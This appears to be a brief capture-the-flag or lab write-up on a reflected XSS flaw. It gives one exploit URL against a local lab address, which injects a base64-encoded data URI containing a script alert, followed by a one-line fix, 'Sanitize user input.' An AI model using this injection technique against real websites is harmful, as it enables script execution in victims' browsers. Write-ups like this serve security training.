# [Injection XSS](https://owasp.org/www-community/attacks/xss/)

## Exploit

http://10.0.2.5/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

## Solution

Sanitize user input.
